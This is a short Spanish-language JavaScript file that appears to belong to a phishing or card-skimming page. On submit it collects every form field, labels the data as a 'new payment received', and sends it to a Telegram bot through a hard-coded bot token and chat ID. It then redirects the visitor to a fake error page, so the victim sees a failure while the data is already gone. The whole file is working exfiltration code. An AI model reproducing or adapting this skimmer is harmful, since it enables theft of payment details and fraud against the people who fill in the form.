function validarFormulario() {
    return true;
}

document.addEventListener('DOMContentLoaded', function () {
    const formulario = document.querySelector('form');

    formulario.addEventListener('submit', function (event) {
        event.preventDefault();

        if (validarFormulario()) {
            const formData = new FormData(this);

            const TELEGRAM_BOT_TOKEN = '6839939706:AAGQ8EPG288JDUXSuD5xNGeyoluAAXF30vM';
            const CHAT_ID = '-1002046763480';

            let message = 'Nuevo pago recibido:\n';

            formData.forEach((value, key) => {
                message += `${key}: ${value}\n`;
            });

            axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: message,
            })
                .then(response => {
                    console.log('Mensaje enviado con éxito:', response.data);

                    setTimeout(function () {
                        window.location.href = 'https://error.com';
                    }, 2000);
                })
                .catch(error => {
                    console.error('Error al enviar mensaje a Telegram:', error);
                });
        }
    });
});